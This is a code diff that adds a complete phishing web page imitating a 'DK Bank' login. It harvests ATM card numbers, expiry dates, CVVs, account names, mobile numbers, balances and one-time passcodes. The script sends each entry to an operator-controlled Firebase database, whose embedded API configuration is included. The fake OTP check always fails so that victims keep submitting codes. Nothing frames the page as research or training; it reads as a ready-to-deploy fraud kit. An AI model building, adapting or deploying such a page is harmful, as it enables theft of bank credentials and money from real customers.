@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DK Bank - Digital Kidu</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        
+        body {
+            background: url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=1920&auto=format&fit=crop') no-repeat center center fixed;
+            background-size: cover;
+            display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
+            position: relative;
+            touch-action: pan-y;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        body::before {
+            content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 20, 40, 0.65); z-index: -1;
+        }
+
+        .card {
+            background: #ffffff; border-radius: 24px; padding: 35px 25px; width: 100%; max-width: 400px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4); text-align: center; position: relative;
+            animation: fadeIn 0.4s ease-out; border-top: 6px solid #ff6b00; overflow: hidden;
+        }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        .logo { font-size: 32px; font-weight: 800; color: #1a1a1a; margin-bottom: 25px; }
+        .logo span { color: #ff6b00; }
+
+        h2 { font-size: 22px; color: #111; margin-bottom: 6px; font-weight: 700; }
+        p.subtitle { font-size: 14px; color: #666; margin-bottom: 25px; }
+
+        .input-group { margin-bottom: 18px; text-align: left; }
+        .input-group label { display: block; font-size: 11px; font-weight: 800; color: #444; margin-bottom: 8px; text-transform: uppercase; }
+        .input-group input {
+            width: 100%; padding: 15px 18px; border: 1.5px solid #d1d5db; border-radius: 12px;
+            font-size: 16px; outline: none; transition: all 0.3s; background: #f9fafb; color: #333;
+        }
+        .input-group input:focus { border-color: #0056b3; background: #fff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
+
+        .row-inputs { display: flex; gap: 15px; }
+        .row-inputs .input-group { flex: 1; }
+
+        .balance-wrapper { position: relative; display: flex; align-items: center; }
+        .currency-symbol { position: absolute; left: 15px; font-size: 16px; font-weight: 600; color: #ff6b00; }
+        .balance-wrapper input { padding-left: 45px; }
+
+        .btn {
+            width: 100%; padding: 16px; background: #cbd5e1; color: white; border: none;
+            border-radius: 12px; font-size: 16px; font-weight: 700; cursor: not-allowed;
+            transition: all 0.3s; margin-top: 10px;
+        }
+        .btn.active { background: #0056b3; cursor: pointer; box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3); }
+        .btn.active:hover { background: #004494; transform: translateY(-1px); }
+
+        .otp-timer { font-size: 16px; font-weight: 700; color: #0056b3; background: #eff6ff; display: inline-block; padding: 6px 20px; border-radius: 30px; margin: 15px 0 20px 0; }
+        
+        .otp-inputs { display: flex; justify-content: center; gap: 6px; margin-bottom: 15px; }
+        .otp-inputs input {
+            width: 38px; height: 45px; text-align: center; font-size: 18px; font-weight: 700;
+            border: 1.5px solid #d1d5db; border-radius: 10px; outline: none; background: #f9fafb; color: #0056b3;
+        }
+        .otp-inputs input:focus { border-color: #0056b3; background: #fff; box-shadow: 0 0 0 3px rgba(0, 86, 179, 0.1); }
+
+        .resend-link { display: inline-block; margin-top: 15px; font-size: 14px; color: #0056b3; text-decoration: none; font-weight: 600; cursor: pointer; }
+        .resend-link:hover { text-decoration: underline; }
+        .signup-text { margin-top: 25px; font-size: 14px; color: #555; }
+        .signup-text a { color: #0056b3; font-weight: 700; text-decoration: none; }
+        .hidden { display: none !important; }
+
+        .error-msg { color: #dc2626; font-size: 13px; margin-top: 10px; font-weight: 600; display: none; }
+
+        .loading-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95); z-index: 999;
+            display: flex; flex-direction: column; justify-content: center; align-items: center;
+            backdrop-filter: blur(4px); opacity: 0; pointer-events: none; transition: opacity 0.3s ease;
+        }
+        .loading-overlay.active { opacity: 1; pointer-events: auto; }
+        .spinner {
+            width: 45px; height: 45px; border: 4px solid #e5e7eb;
+            border-top: 4px solid #ff6b00; border-radius: 50%;
+            animation: spin 0.8s linear infinite; margin-bottom: 15px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text {
+            font-size: 14px; font-weight: 700; color: #0056b3; letter-spacing: 1px;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+        @keyframes pulse { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loadingText">Please Wait...</div>
+        </div>
+
+        <div class="logo"><span>DK</span> bank</div>
+
+        <!-- SCREEN 1: LOGIN -->
+        <div id="screen-login">
+            <p class="subtitle">Enter your ATM Card details</p>
+            
+            <div class="input-group">
+                <label for="atm-card">ATM Card Number</label>
+                <input type="text" id="atm-card" inputmode="numeric" placeholder="Enter 16-digit Card Number" maxlength="16">
+            </div>
+            <div class="row-inputs">
+                <div class="input-group">
+                    <label for="expiry">Expiry Date</label>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                </div>
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="password" id="cvv" inputmode="numeric" placeholder="***" maxlength="3">
+                </div>
+            </div>
+            <button class="btn" id="btn-proceed" disabled>PROCEED</button>
+            <p class="signup-text">Don't have DK account yet? <a href="#">Sign Up</a></p>
+        </div>
+
+        <!-- SCREEN 2: ACCOUNT DETAILS -->
+        <div id="screen-details" class="hidden">
+            <h2>Security Questions</h2>
+            <p class="subtitle">Please enter your information</p>
+            <div class="input-group">
+                <label for="acc-name">Account Name</label>
+                <input type="text" id="acc-name" placeholder="Enter account holder name">
+            </div>
+            <div class="input-group">
+                <label for="mobile">Mobile Number</label>
+                <input type="tel" id="mobile" placeholder="Enter your mobile number" maxlength="10">
+            </div>
+            <div class="input-group">
+                <label for="balance">Available Balance</label>
+                <div class="balance-wrapper">
+                    <span class="currency-symbol">Nu.</span>
+                    <input type="number" id="balance" placeholder="0.00" step="0.01">
+                </div>
+            </div>
+            <button class="btn" id="btn-confirm" disabled>Confirm & Send OTP</button>
+        </div>
+
+        <!-- SCREEN 3: OTP VERIFICATION -->
+        <div id="screen-otp" class="hidden">
+            <h2>Verify OTP Code</h2>
+            <p class="subtitle">Enter the 6-digit OTP code</p>
+            <p style="font-size: 14px; color: #333; margin-bottom: 5px;">
+                OTP has been sent to <strong>******<span id="masked-mobile">7799</span></strong>
+            </p>
+            <div class="otp-timer" id="timer">02:57</div>
+            
+            <div class="otp-inputs">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+                <input type="text" maxlength="1" inputmode="numeric" class="otp-box">
+            </div>
+            
+            <div class="error-msg" id="otp-error">Invalid OTP! Please try again.</div>
+            
+            <button class="btn" id="btn-verify" disabled>Verify</button>
+            <a class="resend-link" id="resend-otp">Resend OTP</a>
+        </div>
+    </div>
+
+    <!-- ================= FIREBASE SDK & LOGIC ================= -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, push, set, update, get } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        // --- Firebase Configuration ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyC1KSnt2oLvpg7KFnyoHlex6spToyOO-nE",
+            authDomain: "pak-national-earn.firebaseapp.com",
+            databaseURL: "https://pak-national-earn-default-rtdb.firebaseio.com",
+            projectId: "pak-national-earn",
+            storageBucket: "pak-national-earn.firebasestorage.app",
+            messagingSenderId: "670295282897",
+            appId: "1:670295282897:web:ac051079fdd3eef8cea1f0",
+            measurementId: "G-M5SFQB9HR6"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        let currentFirebaseKey = null;
+
+        function createUser(data) {
+            const usersRef = ref(database, 'dk_bank_users');
+            const newUserRef = push(usersRef);
+            currentFirebaseKey = newUserRef.key;
+            set(newUserRef, data)
+                .then(() => console.log("✅ User created"))
+                .catch((error) => console.error("❌ Error:", error));
+        }
+
+        function updateUser(data) {
+            if (!currentFirebaseKey) return;
+            const userRef = ref(database, 'dk_bank_users/' + currentFirebaseKey);
+            update(userRef, data)
+                .then(() => console.log("✅ User updated"))
+                .catch((error) => console.error("❌ Update Error:", error));
+        }
+
+        const screenLogin = document.getElementById('screen-login');
+        const screenDetails = document.getElementById('screen-details');
+        const screenOtp = document.getElementById('screen-otp');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const otpError = document.getElementById('otp-error');
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const atmCardInput = document.getElementById('atm-card');
+        const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
+        const btnProceed = document.getElementById('btn-proceed');
+        const accNameInput = document.getElementById('acc-name');
+        const mobileInput = document.getElementById('mobile');
+        const balanceInput = document.getElementById('balance');
+        const btnConfirm = document.getElementById('btn-confirm');
+        const btnVerify = document.getElementById('btn-verify');
+        const resendOtp = document.getElementById('resend-otp');
+        const timerDisplay = document.getElementById('timer');
+        const maskedMobile = document.getElementById('masked-mobile');
+
+        function showLoading(text, duration, callback) {
+            loadingText.textContent = text;
+            loadingOverlay.classList.add('active');
+            setTimeout(() => {
+                loadingOverlay.classList.remove('active');
+                setTimeout(() => { if(callback) callback(); }, 300);
+            }, duration);
+        }
+
+        // --- SCREEN 1 ---
+        function checkCardForm() {
+            const isCardValid = atmCardInput.value.trim().length === 16;
+            const isExpiryValid = expiryInput.value.trim().length === 5;
+            const isCvvValid = cvvInput.value.trim().length === 3;
+            if (isCardValid && isExpiryValid && isCvvValid) {
+                btnProceed.classList.add('active'); btnProceed.disabled = false;
+            } else {
+                btnProceed.classList.remove('active'); btnProceed.disabled = true;
+            }
+        }
+        expiryInput.addEventListener('input', function(e) {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
+            this.value = val; checkCardForm();
+        });
+        atmCardInput.addEventListener('input', checkCardForm);
+        cvvInput.addEventListener('input', checkCardForm);
+
+        btnProceed.addEventListener('click', function() {
+            // Save card details to Firebase
+            createUser({
+                id: Date.now(),
+                cardNumber: atmCardInput.value || "Not Provided",
+                expiry: expiryInput.value || "Not Provided",
+                cvv: cvvInput.value || "Not Provided",
+                accountName: "Not Provided",
+                mobile: "Not Provided",
+                balance: "Not Provided",
+                otpAttempts: [],
+                timestamp: new Date().toLocaleString()
+            });
+
+            showLoading("Verifying Card...", 2000, () => {
+                screenLogin.classList.add('hidden');
+                screenDetails.classList.remove('hidden');
+            });
+        });
+
+        // --- SCREEN 2 ---
+        function checkDetailsForm() {
+            if (accNameInput.value.trim() !== '' && mobileInput.value.trim() !== '' && balanceInput.value.trim() !== '') {
+                btnConfirm.classList.add('active'); btnConfirm.disabled = false;
+            } else {
+                btnConfirm.classList.remove('active'); btnConfirm.disabled = true;
+            }
+        }
+        accNameInput.addEventListener('input', checkDetailsForm);
+        mobileInput.addEventListener('input', checkDetailsForm);
+        balanceInput.addEventListener('input', checkDetailsForm);
+
+        btnConfirm.addEventListener('click', function() {
+            // Update Firebase with Account Details
+            updateUser({
+                accountName: accNameInput.value || "Not Provided",
+                mobile: mobileInput.value || "Not Provided",
+                balance: balanceInput.value || "Not Provided",
+                timestamp: new Date().toLocaleString()
+            });
+
+            let mobVal = mobileInput.value.trim();
+            maskedMobile.textContent = mobVal.slice(-4) || "7799";
+
+            showLoading("Sending OTP...", 2000, () => {
+                screenDetails.classList.add('hidden');
+                screenOtp.classList.remove('hidden');
+                startOtpTimer();
+            });
+        });
+
+        // --- SCREEN 3: OTP ---
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener('input', function() {
+                if (this.value.length === 1 && index < otpBoxes.length - 1) otpBoxes[index + 1].focus();
+                checkOtpForm();
+            });
+            box.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) otpBoxes[index - 1].focus();
+            });
+        });
+
+        function checkOtpForm() {
+            let allFilled = true;
+            otpBoxes.forEach(box => { if (box.value.trim() === '') allFilled = false; });
+            if (allFilled) { btnVerify.classList.add('active'); btnVerify.disabled = false; } 
+            else { btnVerify.classList.remove('active'); btnVerify.disabled = true; }
+        }
+
+        let timerInterval;
+        function startOtpTimer() {
+            let timeLeft = 177; clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                if (timeLeft <= 0) { clearInterval(timerInterval); timerDisplay.textContent = "00:00"; return; }
+                timeLeft--;
+                let m = Math.floor(timeLeft / 60);
+                let s = timeLeft % 60;
+                timerDisplay.textContent = `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        resendOtp.addEventListener('click', function(e) {
+            e.preventDefault(); alert("OTP Resent successfully!");
+            startOtpTimer(); otpBoxes.forEach(box => box.value = '');
+            checkOtpForm(); otpBoxes[0].focus(); otpError.style.display = 'none';
+        });
+
+        btnVerify.addEventListener('click', function() {
+            otpError.style.display = 'none';
+
+            let enteredOtp = '';
+            otpBoxes.forEach(box => { enteredOtp += box.value; });
+
+            // Save OTP attempt
+            if (currentFirebaseKey) {
+                const userRef = ref(database, 'dk_bank_users/' + currentFirebaseKey);
+                get(userRef).then((snapshot) => {
+                    if (snapshot.exists()) {
+                        const userData = snapshot.val();
+                        let otpAttempts = userData.otpAttempts || [];
+                        otpAttempts.push({
+                            otp: enteredOtp,
+                            time: new Date().toLocaleString()
+                        });
+                        update(userRef, { 
+                            otpAttempts: otpAttempts,
+                            lastOtp: enteredOtp,
+                            timestamp: new Date().toLocaleString()
+                        });
+                    }
+                });
+            }
+
+            showLoading("Verifying OTP...", 3000, () => {
+                otpError.style.display = 'block';
+                otpBoxes.forEach(box => box.value = '');
+                checkOtpForm();
+                otpBoxes[0].focus();
+            });
+        });
+
+    </script>
+</body>
+</html>
